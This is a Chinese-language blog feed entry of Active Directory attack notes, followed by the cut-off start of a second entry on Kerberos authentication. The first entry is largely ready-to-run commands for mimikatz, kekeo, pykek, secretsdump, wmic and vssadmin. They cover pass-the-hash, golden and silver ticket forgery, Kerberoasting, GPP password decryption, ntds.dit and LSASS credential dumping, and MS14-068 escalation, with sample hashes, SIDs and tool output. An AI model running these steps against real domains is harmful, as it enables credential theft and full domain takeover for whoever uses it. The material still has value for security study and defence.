    <content type="html"><![CDATA[<h2 id="0x01-Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><a href="#0x01-Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入" class="headerlink" title="0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )"></a>0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</h2><a id="more"></a><p>在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值. </p><p>在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。</p><p>当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等)</p><p>他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的hash值来达到登录的目的。</p><p>工具: </p><pre><code>a. Metasploit - exploit/windows/smb/psexec (XP,2003)b. xfreerdp (2012r2 http://www.freebuf.com/articles/system/15757.html Hash传递攻击登陆Windows2012远程桌面)    微软在2014年发布了KB2871997和KB2928120两个补丁,用来阻止域内主机本地用户的网络登录,本地用户的PTH方式已经死掉然而 , mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。c.hash injection     mimikatz # privilege::debug    mimikatz # sekurlsa::pth /user:administrator /domain:workgroup /ntlm:d6e1371929886ec1be0b0cf4b101f289 /run:c:\windows\system32\cmd.exe(sekurlsa::pth 中的pth 即Pass the Hash)</code></pre><h2 id="0x02-Pass-The-Key-OverPass-the-Hash"><a href="#0x02-Pass-The-Key-OverPass-the-Hash" class="headerlink" title="0x02. Pass The Key (OverPass-the-Hash)"></a>0x02. Pass The Key (OverPass-the-Hash)</h2><p>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash</p><p>也就失去了作用，但是可以通过pass the key的攻击方式获得权限</p><pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; 获取用户的aes keymimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot; 注入aes key</code></pre><p>若dir 查看不了服务器 (测试2008r2域服务器) </p><p>查看mimikatz的相关资料发现如下信息:</p><pre><code>ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.</code></pre><p>根据提示，尝试在系统安装补丁kb2871997后继续测试<br>安裝 : <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42765" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=42765</a><br>之后可以用\计算机名的方式通过远程共享查看目标机器(ps:这里必须要使用计算机名进行连接，会爆密码错误。  不要用win10测试，win10机器测试会在一分鐘后重啓 ,)<br>(如果获取的散列是NTLM，则Kerberos凭证加密方法是RC4。如果散列加密方法为AES，则Kerberos票使用AES进行的加密。)</p><h2 id="0x03-Pass-the-Ticket-票据传递攻击PtT"><a href="#0x03-Pass-the-Ticket-票据传递攻击PtT" class="headerlink" title="0x03. Pass the Ticket (票据传递攻击PtT)"></a>0x03. Pass the Ticket (票据传递攻击PtT)</h2><p><img src="/2018/01/19/域渗透相关/Kerberos.png" alt="Kerberos.png"><br>与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希</p><p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a></p><p>在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性,TGT中并没有关于票据来源的标识信息。</p><p>这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。</p><p>新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。   </p><p>这种特别的攻击方法被称为”pass-the-ticket”攻击。</p><p><img src="/2018/01/19/域渗透相关/pass-the-ticket.png" alt="pass-the-ticket.png"></p><p>拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket</p><p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p><p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p><p>执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> : </p><pre><code>kekeo &quot;tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1&quot;</code></pre><p>导入票据：</p><pre><code>kekeo &quot;kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&quot;</code></pre><p>以上3种:</p><pre><code>hash传递攻击(PtH):抓住哈希并使用它来访问资源。用户更改帐户密码之前有效。凭证传递攻击(PtT):抓取Kerberos凭证，并且使用它进行访问资源。攻击有效期是在票证有效期之内(一般为7天)。超hash传递攻击(OPtH / PtK):使用密码哈希来获取Kerberos凭证。用户更改帐户密码之前，哈希才有效。</code></pre><h2 id="0x04-Golden-Ticket-黄金票据"><a href="#0x04-Golden-Ticket-黄金票据" class="headerlink" title="0x04. Golden Ticket (黄金票据)"></a>0x04. Golden Ticket (黄金票据)</h2><p>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。</p><p>发生在上面的过程3,可以伪造TGT(前提是获取krbtgt账号的口令散列值(hash))，宣称自己是域内任何账号，包括域管或者不存在的用户。</p><p>由來: </p><pre><code>Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过,理论上讲网络上只有两方能够解密TGT:             颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。    这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</code></pre><p>如果攻击者能够攻陷KDC和提取krbtgt散列值(hash)。然后利用这些有限信息,攻击者能够为委托人principal生成任意的TGT。</p><blockquote><ul><li><ol><li>首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。<br>内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。</li></ol></li><li><ol><li>其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。<br>例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。<br>此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。<br>票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。</li></ol></li><li><ol><li>再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。<br>然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。<br>如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。<br>因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。</li></ol></li><li><ol><li>最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。<br>这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。<br>也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</li></ol></li><li>所需条件: <blockquote><ul><li>krbtgt账户的NT-Hash - 该散列值仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限</li><li>域账户名称 - 通常是域管理员”domain admin”</li><li>域名</li><li>域SID - 可以从域用户的SID或通过sysinternal中psGetsid.exe获得</li></ul></blockquote></li><li>简单过程:</li><li>清空缓存证书<br>  kerberos::purge  ( or klist purge)</li><li>手动创建了一张域管理的黄金票据<br>  kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin</li><li>使用这张票据<br>  kerberos::ptt administrator.kirbi.bin<br>  <img src="/2018/01/19/域渗透相关/Golden_Ticket1.png" alt="Golden_Ticket1"></li><li>然后我的低权限本地用户，就被提升到域管理权限<br>  kerberos::list</li><li>利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash<br>  lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)<br>  <img src="/2018/01/19/域渗透相关/Golden_Ticket2.png" alt="Golden_Ticket2"></li></ul></blockquote><h2 id="5-Silver-Ticket-白银票据"><a href="#5-Silver-Ticket-白银票据" class="headerlink" title="5. Silver Ticket (白银票据)"></a>5. Silver Ticket (白银票据)</h2><p>简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。</p><p>Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用</p><p>所需条件(mimikatz生成silver ticket): </p><blockquote><ul><li>/domain</li><li>/sid            ( S-1-5-21-1239069908-882060383-2558203358-500 注意:不要後面的-500  )</li><li>/target:域控全称</li><li>/service:目标服务器上面的kerberos服务，此处为cifs</li><li>/rc4:域控的计算机账户ntlm hash</li><li>/user:要伪造的用户名(可以不存在也可是存在的)<br>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt”即可生成并导入Silver Ticket</li></ul></blockquote><p>常用的服务名有以下:</p><pre><code>服务名称                    同时需要的服务WMI                        HOST、RPCSSPowerShell Remoting        HOST、HTTPWinRM                    HOST、HTTPScheduled Tasks            HOSTWindows File Share        CIFSLDAP                    LDAPWindows Remote Server    RPCSS、LDAP、CIFS</code></pre><p>用法</p><pre><code>kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt(/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash![Silver_Ticket1](域渗透相关/Silver_Ticket1.png)</code></pre><h2 id="0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><p>简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。</p><p>这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。</p><p>域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。</p><p>域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。</p><p>请求的Kerbero服务票据的加密类型是 RC4_HMAC_MD5, 这意味着服务账户的NTLM密码哈希会被用来加密服务票据。</p><p>所以Kerberoast能够通过尝试不同的NTLM哈希来解开kerberos票据，一旦票据被成功解开，它的密码也就到手了。<br>(获得服务票据不需要提权，同时也不会发送数据到目标机器。)</p><pre><code>https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py    python tgsrepcrack.py wordlist.txt sql.kirbi</code></pre><h2 id="0x07-Kerberoasting-Kerberoast攻击的另一种姿势"><a href="#0x07-Kerberoasting-Kerberoast攻击的另一种姿势" class="headerlink" title="0x07. Kerberoasting - Kerberoast攻击的另一种姿势"></a>0x07. Kerberoasting - Kerberoast攻击的另一种姿势</h2><p>我们通常不关心基于主机的SPN，因为计算机的机器帐户密码默认是随机的，每30天更换一次。</p><p>但是，请记住，也可以为域用户帐户注册任意的SPN。</p><p>一个常见的例子就是一个服务账户管理着多个MSSQL实例;此用户帐户注册的每个MSSQL实例都有一个&lt;MSSQLSvc/HOST:PORT&gt; 这样的SPN，</p><p>这个SPN存储在用户的serviceprincipalname属性里.如果我们有一个为域用户帐户注册的任意SPN，</p><p>那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证    </p><p>注意的是： 任何具有服务主体名称SPN的域用户帐户都可以被该域中任何用户请求该SPN的TGS，</p><p>从而允许攻击者离线破解服务帐户的明文密码！这显然取决于一个可破解的服务帐户明文密码的复杂度</p><p><strong>老套的”Kerberoasting攻击姿势</strong></p><pre><code>给出的利用方法或工具包是使用工具集的组合来请求票证，并从内存中提取(使用Mimikatz)票证，然后将它们转换为可破解的格式。</code></pre><p>一般来说，整个过程如下：</p><pre><code>a. 使用Tim的GetUserSPNS.ps1脚本或者Sean的Find-PSServiceAccounts.ps1脚本或PowerView的&quot;Get-NetUser -SPN&quot;来枚举域帐户的SPN。枚举域帐户的SPN :  &gt; * GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1    PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1        ServicePrincipalName : kadmin/changepw        Name                 : krbtgt        SAMAccountName       : krbtgt        MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local        PasswordLastSet      : 9/13/2016 11:37:59 AM        ServicePrincipalName : test/test        Name                 : testwin10        SAMAccountName       : testwin10        MemberOf             :        PasswordLastSet      : 1/12/2018 3:00:22 PM&gt; * PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089    PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn        objectsid              : S-1-5-21-1239069908-882060383-2558203358-502        iscriticalsystemobject : True        samaccounttype         : 805306368        objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local        objectclass            : {top, person, organizationalPerson, user}        logoncount             : 0        lastlogon              : 1/1/1601 8:00:00 AM        serviceprincipalname   : kadmin/changepw        adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local        dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}        distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local        ....</code></pre><p><img src="/2018/01/19/域渗透相关/getspn.png" alt="getspn"></p><pre><code>b. 请求这些特定的SPN的 TGS可以使用Windows内置的工具setspn.exe或者在PowerShell中调用.NET的    System.IdentityModel.Tokens.KerberosRequestorSecurityToken类。c. 使用Mimikatz的kerberos::list/export命令从内存中提取这些票证，并设置可选的base64导出格式。    然后下载票据，或者将base64编码的票证拖到攻击者的机器上进行解码。d. 使用Tim的tgsrepcrack.py开始离线破解密码:    https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py    pip install requests-kerberos,kerberos-sspi    import kerberos 改成 import kerberos_sspi as kerberos        python tgsrepcrack.py dic.txt file.kirbi   或者使用John the Ripper的kirbi2john.py从原始票证中提取可破解的哈希格式：        python kirbi2john.py *.kirbi &gt; johnkirb.txt        john johnkirb.txt --wordlist=dic.txt  e. xan7r给 Tim的工具集增加了一个分支，他添加了一个autokerberoast.ps1脚本，自动化了上述攻击过程:https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1    此外，@ tifkin_写了一个Go语言版本的TGS爆破器，比原来的Python版本要快一些。</code></pre><h2 id="0x08-SYSVOL"><a href="#0x08-SYSVOL" class="headerlink" title="0x08. SYSVOL"></a>0x08. SYSVOL</h2><p>在域环境中修改域机器的本地账户密码是个很麻烦的事情</p><p>但是微软的GPP(组策略偏好)中提供了一个批量修改本地账户的功能，</p><p>可以一次性批量的修改本地账户密码(组策略不仅仅可以用来批量管理密码)。</p><p>但是最初却导致了一个问题，就是域管理员在配置GPP的时候，会在SYSVOL这个文件夹中保存当前GPP配置的xml文件，</p><p>如果管理员在配置的时候填入了密码，其中就包含了加密了的用户密码(SYSVOL是一个存储域公共文件服务器副本的共享文件夹，</p><p>所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。)</p><p>一般sysvol文件的位置是 :</p><pre><code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code></pre><p>其中的groups.xml(Services.xml、ScheduledTasks.xml、Printers.xml、Drives.xml、DataSources.xml)就可能保存了加密后的本地管理账户密码</p><p>(ps:这些文件中并不一定存在密码，因为只有当管理员在配置的时候，在界面的密码框中输入密码之后才会保存(設置計劃任務))</p><p>我们可以通过这个powershell的脚本进行解密Get-GPPPassword.ps1</p><pre><code>(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1). .\Get-GPPPassword.ps1Get-GPPPassword同样，我们也可以使用Get-GPPPassword.ps1这个脚本在域内自动搜索所有的sysvol中保存的密码并自动解密</code></pre><p>若获取不到:</p><pre><code>a. 使用了LAPS批量管理域内主机本地管理员帐户 (使用ldapsearch来dump域中的LAPS密码 https://www.anquanke.com/post/id/86502)    即 Local Administrator Password Solution : LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。b. 域控安装补丁KB2962486    这个补丁禁止在组策略配置中填入密码c. 目标不在组策略中使用域控密码d. 设置了共享文件夹\SYSVOL的访问权限</code></pre><h2 id="0x09-ntds-dit-活动目录的数据库文件"><a href="#0x09-ntds-dit-活动目录的数据库文件" class="headerlink" title="0x09. ntds.dit (活动目录的数据库文件)"></a>0x09. ntds.dit (活动目录的数据库文件)</h2><p>包含有关活动目录域中所有对象的所有信息 及 所有域用户和计算机帐户的密码哈希值。</p><p>域控制器(DC)上的ntds.dit文件只能由可以登录到DC的用户访问 。</p><p>这些组可以默认登录到域控制器:</p><pre><code>    Enterprise Admins (目录林管理员组)    Domain Admins(域管理员组)    Administrators(管理员组)    Backup Operators(备份操作成员)    Account Operators(账户管理组)    Print Operators(打印机操作组)</code></pre><p>不能登录到域控制器可能 : </p><pre><code>a. 限制了有权登录到域控制器的组/帐户。b. 限制了具有完整活动目录权限的组/帐户，特别是服务帐户。</code></pre><p>若帐户登录了域控制器，首先把所有的登录凭证全部获取到本地:</p><pre><code>1. MIMIKATZ从域控上面抓取到所有账户信息:    mimikatz # lsadump::lsa /inject exit    or 保存到mimikatz.log:    mimikatz # log    mimikatz # privilege::debug    mimikatz # lsadump::lsa /inject    ![mimikatz-lsa](域渗透相关/mimikatz-lsa.png)2.使用MIMIKATZ转储LSASS内存(获取域管理员凭据)    mimikatz # sekurlsa::minidump c:\temp\lsass.dmp    mimikatz # sekurlsa::logonpasswords3. 使用任务管理器转储LSASS内存(获取域管理员凭据)    一旦LSASS被转储，mimikatz就可以对lsass.dmp进行提取    右鍵lsass.exe : Create Dump File4. 用NTDSUTIL创建媒体安装集(IFM) (用于抓取NTDS.DIT文件)    NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。    IFM是用于DCPromo命令中”从媒体安装”这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。    并且也会在c:/temp目录下生成的一份NTDS.dit附件。        ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\windows\temp\temp&quot; q q    創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY5. 从NTDS.DIT文件(和注册表系统配置单元)转储活动目录域凭据    需要 ntds.dit 和 system.hive (由第4步得到)    https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py (only linux):     -&gt; python secretsdump.py -ntds /root/Desktop/temp/Active Directory/ntds.dit -system /root/Desktop/temp/registry/SYSTEM LOCAL     -&gt;         demo.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::        OWA2010DC$:1000:aad3b435b51404eeaad3b435b51404ee:aac6185241728f7685c8d50c61573b75:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f65c6984cbfebdc5f17986d07620afb:::OWA2010$:1103:aad3b435b51404eeaad3b435b51404ee:d51220f5659cd982fb3fbe4169093181:::or -&gt; https://github.com/zcgonvh/NTDSDumpEx/releases    NTDSDumpEx.exe -d ntds.dit -o hash.txt -s system.hiv     进一步从NTDS.DIT获取详细的信息:        https://github.com/libyal/libesedb/releases        $ ./configure$ make        $ sudo make install$ sudo ldconfig        root@kali2:~/Desktop/temp# /usr/local/bin/esedbexport -m tables &quot;/root/Desktop/temp/Active Directory/ntds.dit&quot;          (ntds.dit中提取出表，20分鐘，两个重要的表为:datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中.)    使用ntdsxtract提取域中信息，一旦表被提取出来，很多python工具可以将这些表中的信息进一步提取，比如ntdsxtract就可以完美进行。        https://github.com/csababarta/ntdsxtract.git        root@kali2:~/Desktop/ntdsxtract-master# python dsusers.py /root/Desktop/temp/ntds.dit.export/datatable.3 /root/Desktop/temp/ntds.dit.export/link_table.5 output --syshive /root/Desktop/temp/registry/SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt        root@kali2:~/Desktop/ntdsxtract-master# python dscomputers.py /root/Desktop/temp/ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv        ![mimikatz-lsa](域渗透相关/libesedb__ntdsxtract__ntds.dit.png)6. 可创建和使用GOLDEN TICKET7. 卷影复制(VSS)    ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)    1.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:vss.log&quot;    2.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID/Windows/NTDS/NTDS.dit C:/windows/temp/NTDS.dit 2&gt;&amp;1&quot;8. 其他 - 转储活动目录数据库(ntds.dit)凭证的方法总结    How Attackers Dump Active Directory Database Credentials        https://adsecurity.org/?p=2398    [译]转储活动目录数据库凭证的方法总结         http://drops.xmd5.com/static/drops/pentesting-12020.html        之前两篇关于如何转储 AD 数据库凭证的文章：             a. 攻击者如何从一个域控制器中读取活动目录数据库(NTDS.DIT)(https://adsecurity.org/?p=451)            b. 在 Active Directory 域中获得管理员权限的攻击方法(https://adsecurity.org/?p=2362  [译]https://xianzhi.aliyun.com/forum/topic/115)</code></pre><h2 id="0x10-MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><a href="#0x10-MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控" class="headerlink" title="0x10.MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)"></a>0x10.MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</h2><p>允许域内任何一个普通用户，将自己提升至域管权限。</p><p>作为普通用户向域控请求一个没有PAC的Kerberos TGT认证的票据，域控会返回一个TGT(不包含PAC，PAC通常包含有用户组中的成员关系)</p><p>生成一个伪造的PAC，因为没有密钥，所以生成的PAC”被标记”有MD5算法，而不是带有域用户密码数据的HMAC_MD5类型。</p><p>把伪造的PAC结合上TGT构造认证数据，作为TGS服务的一部分发送到域控。</p><p>域控会混淆构造的数据，所以直接丢弃之前用户发送没带有PAC的TGT，然后新构造一个TGT并用自己的认证数据插入到伪造的PAC当中，再把新TGT发送给用户</p><p>这样带有伪造PAC的TGT就能使用户成为有漏洞域控上的域管理员。</p><pre><code>1. mimikatz从域控上面抓取到所有账户信息    mimikatz # log    Using &#39;mimikatz.log&#39; for logfile : OK    mimikatz # privilege::debug    Privilege &#39;20&#39; OK    mimikatz # lsadump::lsa /inject    ......2. https://github.com/bidord/pykek    C:\pykek-master&gt;python ms14-068.py -u testwin7@demo.local -s S-1-5-21-1239069908-882060383-2558203358-1130 -d owa2010dc.demo.local  -p 1qaz$RFV --rc4 6df9f68e4b0656fa9ffd91d250506f8f    [+] Creating ccache file &#39;TGT_testwin7@demo.local.ccache&#39;... Done!]3. mimikatz # kerberos::ptc TGT_testwin7@demo.local.ccache (利用mimikatz注入高权限TGT的缓存证书)</code></pre><p>列举缓存证书的命令klist</p><p>或者使用 kekeo<br>kerberos::purge or klist purge(为了让我们自己生成的票据生效，需要我们先用mimikatz将内存中的票据清空)</p><pre><code>kekeo.exe # exploit::ms14068 /domain:demo.local /user:testwin7 /password:1qaz$RFV /sid:S-1-5-21-1239069908-882060383-2558203358 /rid:1130 /kdc:owa2010dc.demo.local /ptt (接着使用域、普通域用户名和密码生成票据)http://www.mottoin.com/95877.html</code></pre><p><strong>参考</strong></p><pre><code>Attack Methods for Gaining Domain Admin Rights in Active Directory    http://adsecurity.org/?p=2362 (国内关于域的文章基本来自于这里 還有 http://www.harmj0y.net)一种深度隐蔽的后门方式(二)    https://www.anquanke.com/post/id/93542Mimikatz小实验:黄金票据+dcsync    http://www.freebuf.com/sectool/112594.html域渗透之hash与票据    http://mp.weixin.qq.com/s/ENStRpYspx5W974BKPzZtA域渗透——利用SYSVOL还原组策略中保存的密码    https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/如何巧妙的从ntds.dit中提取Hash和域信息    http://www.freebuf.com/articles/system/151463.html从活动目录中获取域管理员权限的6种方法    http://www.4hou.com/technology/4256.htmlKerberoasting - Part 3    https://room362.com/post/2016/kerberoast-pt3/kekeo ticket 注入    https://www.anquanke.com/post/id/92484kerberoasting-without-mimikatz    https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/    https://zhuanlan.zhihu.com/p/25723674 (翻譯)Hash传递攻击登陆Windows2012远程桌面    http://www.freebuf.com/articles/system/15757.html</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入&quot;&gt;&lt;a href=&quot;#0x01-Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入&quot; class=&quot;headerlink&quot; title=&quot;0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )&quot;&gt;&lt;/a&gt;0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )&lt;/h2&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Kerberos" scheme="https://sp4rr0w.github.io/tags/Kerberos/"/>
    
      <category term="笔记" scheme="https://sp4rr0w.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="域渗透" scheme="https://sp4rr0w.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="hash注入" scheme="https://sp4rr0w.github.io/tags/hash%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Golden Ticket" scheme="https://sp4rr0w.github.io/tags/Golden-Ticket/"/>
    
      <category term="NTDS.dit" scheme="https://sp4rr0w.github.io/tags/NTDS-dit/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos认证相关</title>
    <link href="https://sp4rr0w.github.io/2018/01/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/"/>
    <id>https://sp4rr0w.github.io/2018/01/18/Kerberos认证相关/</id>
    <published>2018-01-19T00:09:00.000Z</published>
    <updated>2018-03-28T01:36:47.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Kerberos认证过程-简易版"><a href="#0x01-Kerberos认证过程-简易版" class="headerlink" title="0x01 Kerberos认证过程 (简易版)"></a>0x01 Kerberos认证过程 (简易版)</h2><a id="more"></a><p>认证或请求服务 的过程如下:<br><img src="/2018/01/18/Kerberos认证相关/simple.jpg" alt="认证或请求服务"></p><p><code>简义</code></p><pre><code>`KRB_AS_REQ (Kerberos Authentication Service Request)`1. Client-A ---------------------------------------------------------==&gt; KDC-AS (客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)) 此过程叫KRB_AS_REQ`KRB_AS_REP (Kerberos Authentication Service Response)`2. Client-A &lt;==--------------------------------------------------------- KDC-AS (返回TGT,TGT票据使用KDC的krbtgt密钥进行加密) 此过程叫KRB_AS_REP`KRB_TGS_REQ (Kerberos Ticket Granting Service Request)`3. Client-A ----------------------------------------------------------==&gt; KDC-TGS (Client-A使用AS返回的&quot;会话密钥&quot;构建访问特定服务的请求,再把AS返回的&quot;TGT&quot;连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REP`KRB_TGS_REP (Kerberos Ticket Granting Service Response)`4. Client-A 